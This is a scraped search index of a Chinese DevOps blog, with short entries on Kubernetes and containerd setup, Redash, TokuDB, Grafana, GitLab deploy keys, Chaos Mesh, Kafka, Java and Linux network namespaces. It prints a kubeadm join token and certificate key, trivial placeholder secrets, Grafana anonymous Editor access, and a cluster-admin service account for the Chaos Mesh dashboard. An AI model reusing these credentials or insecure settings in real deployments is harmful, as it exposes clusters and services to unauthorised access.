小数位精确到7位 float64 8byte 小数位精确到15位 ","date":"2022-02-27 18:39","objectID":"/post/2798/:0:3","tags":["golang","go"],"title":"golang数据类型","uri":"/post/2798/"},{"categories":["golang"],"content":"包名称 包名称和所在的目录保持一致，包名应该是小写,不使用下划线或者混合大小写 package events ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:1","tags":["golang","go"],"title":"golang命名规范","uri":"/post/2797/"},{"categories":["golang"],"content":"文件名 小写,使用下划线分割单词 configmap_manager.go ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:2","tags":["golang","go"],"title":"golang命名规范","uri":"/post/2797/"},{"categories":["golang"],"content":"结构体 驼峰命名，大驼峰还是小驼峰取决于访问权限 type simpleConfigMapManager struct { kubeClient clientset.Interface } ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:3","tags":["golang","go"],"title":"golang命名规范","uri":"/post/2797/"},{"categories":["golang"],"content":"接口命名 同结构体，名字一般以er结尾 type Manager interface { GetConfigMap(namespace, name string) (*v1.ConfigMap, error) RegisterPod(pod *v1.Pod) UnregisterPod(pod *v1.Pod) } ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:4","tags":["golang","go"],"title":"golang命名规范","uri":"/post/2797/"},{"categories":["golang"],"content":"变量命名 同结构体，如果变量类型为 bool 类型，则名称应以 has, is, can 或 allow 开头。 var isExist bool var hasConflict bool var canManage bool var allowGitHook bool ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:5","tags":["golang","go"],"title":"golang命名规范","uri":"/post/2797/"},{"categories":["golang"],"content":"单元测试 文件名以_test.go结尾，测试用例中的函数以Test开头 // implicit_test.go func TestImplicit(t *testing.T) { } ","date":"2022-02-27 17:47","objectID":"/post/2797/:0:6","tags":["golang","go"],"title":"golang命名规范","uri":"/post/2797/"},{"categories":["系统服务"],"content":"安装 安装docker-compose curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose 配置env secret可以用pwgen -1s 32生成 PYTHONUNBUFFERED=0 REDASH_LOG_LEVEL=INFO REDASH_REDIS_URL=redis://redis:6379/0 POSTGRES_PASSWORD=123 REDASH_COOKIE_SECRET=456 REDASH_SECRET_KEY=789 REDASH_DATABASE_URL=postgresql://postgres:123@postgres/postgres REDASH_MAIL_SERVER=\"1.1.1.1\" REDASH_MAIL_PORT=25 REDASH_MAIL_USE_TLS=\"false\" REDASH_MAIL_USE_SSL=\"false\" REDASH_MAIL_DEFAULT_SENDER=\"redash@soulchild.cn\" 准备yaml version: \"2\" x-redash-service: \u0026redash-service image: redash/redash:10.0.0.b50363 depends_on: - postgres - redis env_file: /opt/redash/env restart: always services: server: \u003c\u003c: *redash-service command: server ports: - \"5000:5000\" environment: REDASH_WEB_WORKERS: 4 scheduler: \u003c\u003c: *redash-service command: scheduler environment: QUEUES: \"celery\" WORKERS_COUNT: 1 scheduled_worker: \u003c\u003c: *redash-service command: worker environment: QUEUES: \"scheduled_queries,schemas\" WORKERS_COUNT: 1 adhoc_worker: \u003c\u003c: *redash-service command: worker environment: QUEUES: \"queries\" WORKERS_COUNT: 2 redis: image: redis:5.0-alpine restart: always postgres: image: postgres:9.6-alpine env_file: /opt/redash/env volumes: - /data/postgres-data:/var/lib/postgresql/data restart: always nginx: image: redash/nginx:latest ports: - \"80:80\" depends_on: - server links: - server:redash restart: always 启动 # 初始化数据库(只有第一次启动需要执行) docker-compose run --rm server create_db # 启动redash相关组件 docker-compose up -d ","date":"2022-02-16 13:10","objectID":"/post/2796/:0:1","tags":["redash"],"title":"redash安装升级","uri":"/post/2796/"},{"categories":["系统服务"],"content":"升级 升级不能垮版本升级,需要一个版本一个版本的升级. 1.首先备份pg数据库和env docker-compose exec postgres pg_dump -Upostgres -d postgres \u003e /backup/redash-backup.sql cp env /backup/env 2.升级镜像,修改yaml为新版本的镜像 3.升级db docker-compose run --rm server manage db upgrade 4.启动服务 docker-compose up -d ","date":"2022-02-16 13:10","objectID":"/post/2796/:0:2","tags":["redash"],"title":"redash安装升级","uri":"/post/2796/"},{"categories":["docker"],"content":"解决办法： 1、将docker-runc替换为runc grep -rl ‘docker-runc’ /var/lib/docker/containers/ | xargs sed -i ’s/docker-runc/runc/g’ 2、重启docker systemctl restart docker ","date":"2022-02-10 16:13","objectID":"/post/2795/:0:0","tags":["docker"],"title":"解决docker升级后不兼容问题Error response from daemon: Unknown runtime specified docker-runc","uri":"/post/2795/"},{"categories":["databases"],"content":"安装文档 https://www.percona.com/doc/percona-server/5.6/tokudb/tokudb_installation.html yum remove mariadb-libs yum install -y libaio perl-devel jemalloc autoconf perl-Test-Simple 下载地址 https://downloads.percona.com/downloads/Percona-Server-5.6/Percona-Server-5.6.51-91.0/binary/redhat/7/x86_64/Percona-Server-5.6.51-91.0-rb59139e-el7-x86_64-bundle.tar rpm -ivh * 关闭大页内存 echo never \u003e /sys/kernel/mm/transparent_hugepage/enabled echo never \u003e /sys/kernel/mm/transparent_hugepage/defrag 安装udf mysql -uroot -p -e \"CREATE FUNCTION fnv1a_64 RETURNS INTEGER SONAME 'libfnv1a_udf.so'\" mysql -uroot -p -e \"CREATE FUNCTION fnv_64 RETURNS INTEGER SONAME 'libfnv_udf.so'\" mysql -uroot -p -e \"CREATE FUNCTION murmur_hash RETURNS INTEGER SONAME 'libmurmur_udf.so'\" 启用tokudb ps_tokudb_admin --enable -u root -p 启用热备份功能 ps_tokudb_admin --enable-backup -uroot -p 开始一个热备份 mysql\u003e set tokudb_backup_dir='/var/lib/mysql-bak/'; Query OK, 0 rows affected (0.14 sec) CREATE DATABASE `testdb1` DEFAULT CHARACTER SET utf8; CREATE TABLE `ad` ( `id` int(8) unsigned NOT NULL, `content` text, PRIMARY KEY (`id`) ) ENGINE=TokuDB DEFAULT CHARSET=utf8; 最终配置文件 # Percona Server template configuration [mysqld] character-set-server = utf8 collation-server = utf8_general_ci # # Remove leading # and set to the amount of RAM for the most important data # cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%. # innodb_buffer_pool_size = 128M # # Remove leading # to turn on a very important data integrity option: logging # changes to the binary log between backups. # log_bin # # Remove leading # to set options mainly useful for reporting servers. # The server defaults are faster for transactions and fast SELECTs. # Adjust sizes as needed, experiment to find the optimal values. # join_buffer_size = 128M # sort_buffer_size = 2M # read_rnd_buffer_size = 2M datadir=/var/lib/mysql socket=/var/lib/mysql/mysql.sock pid-file = /var/run/mysqld/mysqld.pid log-error = /var/log/mysqld.err # me relay_log_info_repository=TABLE master_info_repository=TABLE relay_log_recovery=ON # Slow Log Settings slow_query_log log-slow-slave-statements long_query_time = 1 slow_query_log_file = /var/log/mysql-slow.log # Tunning #key_buffer_size = 2G #myisam_sort_buffer_size = 128M memlock max_allowed_packet = 64M table_open_cache = 512 sort_buffer_size = 2M read_buffer_size = 1M read_rnd_buffer_size = 4M query_cache_size = 0 query_cache_type = 0 thread_cache_size = 64 net_buffer_length = 512K wait_timeout = 30 max_connections = 512 max_connect_errors = 100000 interactive_timeout = 180 # tokudb loose-tokudb_fs_reserve_percent = 1 #toku backup requirement innodb_use_native_aio=0 # master slave server-id = 200 # Master Settings #log-bin = /home/mysql/binlog/mysql-bin #binlog_format= row #statement,mixed,row #max_binlog_size = 100M #expire-logs-days = 7 log-slave-updates # Slave Settings relay-log = mysql-relay-bin # Disabling symbolic-links is recommended to prevent assorted security risks symbolic-links=0 # Recommended in standard MySQL setup sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES [mysqld_safe] preload-hotbackup thp-setting=never log-error=/var/log/mysqld.log pid-file=/var/run/mysqld/mysqld.pid ","date":"2022-01-28 21:38","objectID":"/post/2791/:0:0","tags":["mysql"],"title":"mysql tokudb引擎","uri":"/post/2791/"},{"categories":["基础内容"],"content":"查看证书 echo | openssl s_client -servername xxx.com -connect soulchild.cn:443 2\u003e/dev/null | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' ","date":"2022-01-18 17:36","objectID":"/post/2788/:0:1","tags":["ssl","openssl"],"title":"openssl查看证书","uri":"/post/2788/"},{"categories":["基础内容"],"content":"过期时间 echo | openssl s_client -servername xxx.com -connect soulchild.cn:443 2\u003e/dev/null | openssl x509 -noout -dates ","date":"2022-01-18 17:36","objectID":"/post/2788/:0:2","tags":["ssl","openssl"],"title":"openssl查看证书","uri":"/post/2788/"},{"categories":["基础内容","监控"],"content":"https://grafana.com/docs/grafana/latest/auth/overview/#anonymous-authentication 配置如下 [auth] disable_login_form = true [auth.anonymous] enabled = true # 匿名权限相关配置 org_role = Editor ","date":"2022-01-13 19:27","objectID":"/post/2786/:0:0","tags":["grafana"],"title":"grafana匿名登陆","uri":"/post/2786/"},{"categories":["kubernetes"],"content":"参考: https://kubernetes.io/zh/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/ https://kubernetes.io/zh/docs/reference/setup-tools/kubeadm/kubeadm-init ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:0","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"一、调整内核参数及模块 cat \u003c\u003cEOF | sudo tee /etc/modules-load.d/k8s.conf br_netfilter EOF cat \u003c\u003cEOF | sudo tee /etc/modules-load.d/containerd.conf overlay br_netfilter EOF sudo modprobe overlay sudo modprobe br_netfilter # 设置必需的 sysctl 参数，这些参数在重新启动后仍然存在。 cat \u003c\u003cEOF | sudo tee /etc/sysctl.d/99-kubernetes-cri.conf net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 net.bridge.bridge-nf-call-ip6tables = 1 EOF # 应用 sysctl 参数而无需重新启动 sudo sysctl --system ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:1","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"二、修改主机名、配置hosts cat \u003e\u003e /etc/hosts \u003c\u003cEOF 10.0.33.162 k8s-master 10.0.33.163 k8s-node1 10.0.33.164 k8s-node2 10.0.33.165 k8s-node3 10.0.33.166 k8s-node4 10.0.33.167 k8s-node5 10.0.33.168 k8s-node6 10.0.33.169 k8s-node7 EOF ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:2","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"三、安装containerd sudo apt-get remove docker docker-engine docker.io containerd runc sudo apt-get update sudo apt-get install \\ ca-certificates \\ curl \\ gnupg \\ lsb-release curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null sudo apt-get update sudo apt-get install containerd sudo mkdir -p /etc/containerd containerd config default | sudo tee /etc/containerd/config.toml sudo systemctl start containerd ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:3","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"四、配置containerd # 修改cgroups为systemd sudo sed -i 's#SystemdCgroup = false#SystemdCgroup = true#' /etc/containerd/config.toml # 修改基础设施镜像 sudo sed -i 's#sandbox_image = \"k8s.gcr.io/pause:3.5\"#sandbox_image = \"registry.aliyuncs.com/google_containers/pause:3.6\"#' /etc/containerd/config.toml sudo systemctl restart containerd ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:4","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"四、安装kubeadm、kubectl、kubelet curl -fsSL https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/kubernetes-archive-keyring.gpg echo \"deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main\" | sudo tee /etc/apt/sources.list.d/kubernetes.list sudo apt-get update sudo apt-get install -y kubelet=1.23.1 kubeadm=1.23.1 kubectl=1.23.1 # 阻止upgrade的时候更新包 sudo apt-mark hold kubelet kubeadm kubectl ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:5","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"五、安装 sudo kubeadm init --kubernetes-version stable-1 \\ --apiserver-advertise-address 10.0.33.162 \\ --control-plane-endpoint k8s-master \\ --image-repository registry.aliyuncs.com/google_containers \\ --pod-network-cidr 172.17.0.0/16 \\ --service-cidr 172.16.0.0/16 \\ --cri-socket /run/containerd/containerd.sock \\ --ignore-preflight-errors NumCPU \\ --upload-certs --v 5| tee kubeadm-init.log ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:6","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"六、配置kubeconfig mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:7","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"七、添加节点 # master节点 kubeadm join k8s-master:6443 --token 0s2sl7.dz31xgqybfiytgpk \\ --discovery-token-ca-cert-hash sha256:4ae005a85ef260b48a71cd5c93f4a7900e376b03ff80debe3cd08ab14021535b \\ --control-plane --certificate-key 9980691961686c8cbf8a3ddb4ecdde88e80f40d65f7b270ab3dc8e8afbc36102 # node节点 kubeadm join k8s-master:6443 --token 0s2sl7.dz31xgqybfiytgpk \\ --discovery-token-ca-cert-hash sha256:4ae005a85ef260b48a71cd5c93f4a7900e376b03ff80debe3cd08ab14021535b ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:8","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["kubernetes"],"content":"八、安装calico curl https://docs.projectcalico.org/archive/v3.20/manifests/calico.yaml -O kubectl apply -f calico.yaml ","date":"2021-12-29 22:17","objectID":"/post/2785/:0:9","tags":["k8s"],"title":"ubuntu使用kubeadm安装k8s1.23.1","uri":"/post/2785/"},{"categories":["系统服务"],"content":"某定时任务提示gitlab账号被锁定,导致无法正常执行,猜测可能是由于人员离职,gitlab账号被禁用导致。私钥可以查看到,但是由于不知道公钥配置到哪个人的账户下了，所以需要查一下公钥配置在哪个用户上,但是gitlab上没有相关的功能，所以准备去数据库里查询一下 ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:0","tags":["gitlab"],"title":"gitlab查找忘记的公钥","uri":"/post/2783/"},{"categories":["系统服务"],"content":"1.根据私钥推导出公钥 ssh-keygen -y -e -f /root/.ssh/id_rsa ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:1","tags":["gitlab"],"title":"gitlab查找忘记的公钥","uri":"/post/2783/"},{"categories":["系统服务"],"content":"2.连接gitlab数据库 sudo -u gitlab-psql /opt/gitlab/embedded/bin/psql -h /var/opt/gitlab/postgresql -d gitlabhq_production ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:2","tags":["gitlab"],"title":"gitlab查找忘记的公钥","uri":"/post/2783/"},{"categories":["系统服务"],"content":"3.查看这个公钥是哪个用户创建的 # 取公钥的一段内容,模糊查询即可 \\x select user_id,key,type from keys where key like '%xxxxxxxxx%'; ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:3","tags":["gitlab"],"title":"gitlab查找忘记的公钥","uri":"/post/2783/"},{"categories":["系统服务"],"content":"4.根据用户id查看用户邮箱 select email from users where id = '210'; 至此,本以为可以去那个人的账户删除公钥,使用公共账户重新添加,但是这世间往往总是事与愿违，在这个人的ssh keys里并没发现这个公钥,后面发现这个公钥的类型是DeployKey,所以准备去查看全局DeployKeys(设置[Admin Area]-DeployKeys)。 但是并没有在DeployKeys中找到相关公钥,想了想可能是在gitlab仓库中添加的,于是去定时任务使用的gitlab仓库中查看(仓库-Settings-Repository-Deploy Keys),发现了一个比较像的,由于不能看到公钥信息,只能查看指纹信息,所以需要计算一下公钥的指纹,做一下对比. ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:4","tags":["gitlab"],"title":"gitlab查找忘记的公钥","uri":"/post/2783/"},{"categories":["系统服务"],"content":"5.计算公钥指纹 md5: echo 'ssh-rsa AAAAxxx6xxxxxxxxx' | ssh-keygen -E md5 -lf - sha256: echo 'ssh-rsa AAAAxxx6xxxxxxxxx' | ssh-keygen -lf - 发现是一致的,这种只针对某个仓库建的deploykey,是可以删除的 ","date":"2021-12-27 10:59","objectID":"/post/2783/:0:5","tags":["gitlab"],"title":"gitlab查找忘记的公钥","uri":"/post/2783/"},{"categories":["系统服务"],"content":"6.删除使用重建一个全局的deploykey","date":"2021-12-27 10:59","objectID":"/post/2783/:0:6","tags":["gitlab"],"title":"gitlab查找忘记的公钥","uri":"/post/2783/"},{"categories":["云原生"],"content":"1. 部署被注入故障的服务 apiVersion: apps/v1 kind: Deployment metadata: name: web-show labels: app: web-show spec: replicas: 1 selector: matchLabels: app: web-show template: metadata: labels: app: web-show spec: containers: - name: web-show image: pingcap/web-show imagePullPolicy: Always command: - /usr/local/bin/web-show - --target-ip=$(targetIP) env: - name: targetIP valueFrom: fieldRef: apiVersion: v1 fieldPath: status.hostIP ports: - name: web-port containerPort: 8081 hostPort: 8081 --- apiVersion: v1 kind: Service metadata: name: web-show labels: app: web-show spec: type: NodePort ports: - name: web targetPort: web-port port: 8081 selector: app: web-show ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:1","tags":["混沌工程","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-延迟注入测试","uri":"/post/2777/"},{"categories":["云原生"],"content":"2.查看web-show服务 00805-wt8lrefrvuc.png ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:2","tags":["混沌工程","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-延迟注入测试","uri":"/post/2777/"},{"categories":["云原生"],"content":"3. 准备故障注入清单文件 给web-show pod注入1分钟的30ms网络延迟 apiVersion: chaos-mesh.org/v1alpha1 kind: NetworkChaos metadata: name: web-show-network-delay spec: # 指定的动作,延迟 action: delay # 指定生效的范围,即对哪些pod进行故障注入 selector: namespaces: - default labelSelectors: app: web-show # 对selector选出的pod进行更细粒度的控制 mode: one # 增加30ms延迟 delay: latency: 30ms # 故障持续时间 duration: 1m one（表示随机选出一个符合条件的 Pod） all（表示选出所有符合条件的 Pod） fixed（表示选出指定数量且符合条件的 Pod） fixed-percent（表示选出占符合条件的 Pod 中指定百分比的 Pod） random-max-percent（表示选出占符合条件的 Pod 中不超过指定百分比的 Pod） ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:3","tags":["混沌工程","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-延迟注入测试","uri":"/post/2777/"},{"categories":["云原生"],"content":"4.最终效果 86448-cnm9oar8tju.png ","date":"2021-12-14 19:28","objectID":"/post/2777/:0:4","tags":["混沌工程","chaos-mesh","chaosmesh","cloudnative"],"title":"ChaosMesh-延迟注入测试","uri":"/post/2777/"},{"categories":["云原生"],"content":"实验环境: k8s v1.21.0 helm v3.1.2 1、创建namespace kubectl create namespace chaos-mesh 2、用helm直接安装 helm repo add chaos-mesh https://charts.chaos-mesh.org helm repo update # 使用helm安装 # docker cri helm install chaos-mesh chaos-mesh/chaos-mesh --version v2.0.0 --namespace chaos-mesh # containerd cri helm install chaos-mesh chaos-mesh/chaos-mesh --version v2.0.0 --namespace chaos-mesh --set chaosDaemon.runtime=containerd --set chaosDaemon.socketPath=/run/containerd/containerd.sock 清单生成: helm template chaos-mesh chaos-mesh/chaos-mesh –version v2.0.0 –include-crds –namespace chaos-mesh \u003e chaos-mesh.install.yaml 3、查看安装的组件 kubectl get deploy,ds,pods,svc --namespace chaos-mesh chaos-controller-manager: Chaos Mesh的核心逻辑组件，主要负责混沌实验的调度与管理。该组件包含多个 CRD Controller，例如 Workflow Controller、Scheduler Controller 以及各类故障类型的 Controller。 chaos-daemon: 是具体执行故障注入的组件，以daemonset的方式运行.默认拥有Privileged权限（可以关闭）。该组件主要通过侵入目标 Pod Namespace 的方式干扰具体的网络设备、文件系统、内核等。 chaos-dashboard: 可视化组件，用户可通过该界面对混沌实验进行操作和观测。同时，Chaos Dashboard 还提供了 RBAC 权限管理机制。 4、通过nodeport访问dashboard 5、配置token # 创建超级管理员账号 k create sa -n chaos-mesh superadmin # 绑定管理员权限 k create clusterrolebinding --clusterrole=cluster-admin --serviceaccount=chaos-mesh:superadmin superadmin-binding # 获取登陆token k get secret -n chaos-mesh $(k get sa -n chaos-mesh superadmin -o jsonpath={.secrets[0].name}) -o jsonpath={.data.token} | base64 -d name随便输入，token输入我们获取的，然后就可以去dashboard中探索混沌工程的世界了 ","date":"2021-12-14 17:37","objectID":"/post/2774/:0:0","tags":["混沌工程","chaos-mesh","chaosmesh"],"title":"ChaosMesh-安装","uri":"/post/2774/"},{"categories":["系统服务"],"content":"方法一 修改kafka配置文件 log.retention.hours=24 log.cleanup.policy=delete ","date":"2021-12-09 21:06","objectID":"/post/2767/:0:1","tags":["kafka"],"title":"kafka修改topic中的消息保留时间","uri":"/post/2767/"},{"categories":["系统服务"],"content":"方法二 使用kafka脚本 ./kafka-configs.sh --zookeeper localhost:2181 --alter --entity-name testlog --entity-type topics --add-config retention.ms=86400000 ","date":"2021-12-09 21:06","objectID":"/post/2767/:0:2","tags":["kafka"],"title":"kafka修改topic中的消息保留时间","uri":"/post/2767/"},{"categories":["系统服务"],"content":"方法三 使用kafka-manager 51303-tqyz0z8jibb.png 38008-tno15juopb.png 28708-hz6lb4dfj7n.png ","date":"2021-12-09 21:06","objectID":"/post/2767/:0:3","tags":["kafka"],"title":"kafka修改topic中的消息保留时间","uri":"/post/2767/"},{"categories":["java"],"content":" static可以用来修饰属性、方法、代码块(可以称为静态属性、静态方法、静态代码块) 类中的静态属性是所有对象共享的 静态属性和静态方法可以直接通过类来调用(因为存在jvm内存的方法区中，而不是堆中的对象中) 静态方法不能使用this 静态方法 只能调用静态属性和静态方法(因为他们是属于类的) 不能调用成员属性和成员方法(因为他们是属于对象的) 静态属性 都可以调用 静态代码块只有在第一次new的时候会执行，并且是优先执行的。 ","date":"2021-11-20 23:49","objectID":"/post/2754/:0:0","tags":["java"],"title":"java static关键字","uri":"/post/2754/"},{"categories":["java"],"content":" 方法名和类名一致 只能使用权限修饰符 不能指定返回类型 和python中的__init__方法差不多 package cn.soulchild.part1; public class StrucTure { int age = 1; static { System.out.println(\"在类中定义称为静态构造代码块，只有在第一次new对象的时候执行，执行顺序1\"); } { System.out.println(\"在类中定义称为构造代码块，每次new对象的时候执行，执行顺序2\"); } public StrucTure(){ System.out.println(\"构造方法，每次new对象的时候执行，执行顺序3\"); } public void print() { System.out.println(age); } } ","date":"2021-11-20 21:55","objectID":"/post/2753/:0:0","tags":["java"],"title":"java构造方法","uri":"/post/2753/"},{"categories":["其他"],"content":"安装dapr-cli wget https://github.91chifun.workers.dev/https://github.com//dapr/cli/releases/download/v1.5.0/dapr_linux_amd64.tar.gz tar xf dapr_linux_amd64.tar.gz mv dapr /usr/local/bin/ 在kubernetes中安装dapr dapr init -k --enable-mtls=false ","date":"2021-11-16 19:47","objectID":"/post/2751/:0:0","tags":["k8s"],"title":"Dapr安装记录","uri":"/post/2751/"},{"categories":["其他","虚拟化"],"content":"一、基本命令 # 创建ns ip netns add newns # 删除ns ip netns delete newns # 查看ns ip netns ls # 在指定的ns中执行命令 ip netns exec newns ip # 进入指定ns的shell ip netns exec newns bash -rcfile \u003c(echo \"PS1='newns \u003e '\") # 修改网卡名 ip netns exec newns ip link set dev 网卡名 name 新网卡名 # 启动网卡 ip link set dev lo up # 创建veth设备 ip link add 网卡名1 type veth peer name 网卡名2 # 将peer1网卡分配到指定的ns中 ip link set 网卡名 netns ns名 # 创建网桥 ip link add 网卡名 type bridge # 为网卡配置ip ip addr add dev 网卡名 192.168.1.10/24 # 将网卡桥接到网桥网卡中 ip link set 网卡名 master 网桥网卡名 # 查看桥接设备 brctl show ","date":"2021-11-07 20:50","objectID":"/post/2745/:0:1","tags":["linux"],"title":"ip命令管理Network Namespace相关操作","uri":"/post/2745/"},{"categories":["其他","虚拟化"],"content":"二、实现两个namespace的通信 1.创建两个ns ip netns add ns1 ip netns add ns2 2.创建一对veth网卡设备(每对veth设备都是互相连通的) # 创建ns1网卡，类型为veth对等设备，对等设备的名称是ns2 ip link add ns1 type veth peer name ns2 通过ethtool -S veth设备名 可以查看到网卡索引，通过ip a |grep '^索引'可以看到网卡信息。 使用ip a可以看到ns2@ns1和ns1@ns2两个网卡设备 3.分配veth设备到不同的namespace # 前面的ns1是网卡名,后面的ns1是namespace名称 ip link set ns1 netns ns1 ip link set ns2 netns ns2 注意: 分配后在默认的network namespace中就看不到我们创建的一对veth网卡设备了,因为他们已经被分配到其他的namespace中 4.为两个namespace的veth网卡设置ip并启动网卡 # 设置ip ip netns exec ns1 ip addr add dev ns1 192.168.1.10/24 ip netns exec ns2 ip addr add dev ns2 192.168.1.11/24 # 启动网卡 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set ns1 up ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set ns2 up 5.ping测试 # ns1 ping ns2 ip netns exec ns1 ping 192.168.1.11 # ns2 ping ns1 ip netns exec ns2 ping 192.168.1.10 ","date":"2021-11-07 20:50","objectID":"/post/2745/:0:2","tags":["linux"],"title":"ip命令管理Network Namespace相关操作","uri":"/post/2745/"},{"categories":["其他","虚拟化"],"content":"三、模拟docker使用网桥实现不同namespace的通信 1.创建两个ns ip netns add ns3 ip netns add ns4 2.创建bridge类型的网卡(网桥相当于交换机) ip link add mydocker0 type bridge 3.创建、分配、桥接veth设备 # 创建veth设备(一端放在ns3里，另一端和mydocker0桥接) ip link add ns3 type veth peer name ns3tomydocker0 # 分配其中一块veth设备到ns3中 ip link set ns3 netns ns3 # 将另一块veth设备桥接到mydocker0中 ip link set ns3tomydocker0 master mydocker0 同理也需要为ns4做同样的操作 # 创建veth设备(一端放在ns4里，另一端和mydocker0桥接) ip link add ns4 type veth peer name ns4tomydocker0 # 分配其中一块veth设备到ns4中 ip link set ns4 netns ns4 # 将另一块veth设备桥接到mydocker0中 ip link set ns4tomydocker0 master mydocker0 通过bridge link可以查看桥接状态 4.为两个namespace的veth网卡设置ip并启动网卡 # 为ns3和ns4中的网卡设置ip ip netns exec ns3 ip addr add dev ns3 192.168.2.10/24 ip netns exec ns4 ip addr add dev ns4 192.168.2.11/24 # 启动ns3和ns4中的网卡 ip netns exec ns3 ip link set lo up ip netns exec ns3 ip link set ns3 up ip netns exec ns4 ip link set lo up ip netns exec ns4 ip link set ns4 up # 启动ns3和ns4对端的网卡 ip link set ns3tomydocker0 up ip link set ns4tomydocker0 up 5.启动mydocker0网桥 ip link set mydocker0 up 6.ping测试 ip netns exec ns3 ping 192.168.2.11 ip netns exec ns4 ping 192.168.2.10 上面的配置不能让ns内部访问外网,要访问外网需要给mydocker0配置ip地址，ns内部配置路由规则指向mydocker0,在宿主机添加iptables snat. 操作如下 # 给docker0配置IP ip addr add dev mydocker0 192.168.2.1/24 # 配置ns3、ns4的默认网关为docker0 ip netns exec ns3 route add -net default gw 192.168.2.1 ip netns exec ns4 route add -net default gw 192.168.2.1 # 配置SNAT，访问外部网络 iptables -t nat -I POSTROUTING -s 192.168.2.0/24 -j MASQUERADE # 配置DNS mkdir -p /etc/netns/ns3 \u0026\u0026 echo \"nameserver 223.5.5.5\" | tee -a /etc/netns/ns3/resolv.conf mkdir -p /etc/netns/ns4 \u0026\u0026 echo \"nameserver 223.5.5.5\" | tee -a /etc/netns/ns4/resolv.conf ","date":"2021-11-07 20:50","objectID":"/post/2745/:0:3","tags":["linux"],"title":"ip命令管理Network Namespace相关操作","uri":"/post/2745/"},{"categories":["基础内容","docker","kubernetes"],"content":"作者: 酷壳–CoolShell 原文: https://coolshell.cn/articles/17029.html Network的Namespace比较啰嗦。在Linux下，我们一般用ip命令创建Network Namespace（Docker的源码中，它没有用ip命令，而是自己实现了ip命令内的一些功能——是用了Raw Socket发些“奇怪”的数据，呵呵）。这里，我还是用ip命令讲解一下。 首先，我们先看个图，下面这个图基本上就是Docker在宿主机上的网络示意图（其中的物理网卡并不准确，因为docker可能会运行在一个VM中，所以，这里所谓的“物理网卡”其实也就是一个有可以路由的IP的网卡） 69395-esxyvv0vnym.png 上图中，Docker使用了一个私有网段，172.40.1.0，docker还可能会使用10.0.0.0和192.168.0.0这两个私有网段，关键看你的路由表中是否配置了，如果没有配置，就会使用，如果你的路由表配置了所有私有网段，那么docker启动时就会出错了。 当你启动一个Docker容器后，你可以使用ip link show或ip addr show来查看当前宿主机的网络情况（我们可以看到有一个docker0，还有一个veth22a38e6的虚拟网卡——给容器用的）： hchen@ubuntu:~$ ip link show 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state ... link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: eth0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc ... link/ether 00:0c:29:b7:67:7d brd ff:ff:ff:ff:ff:ff 3: docker0: 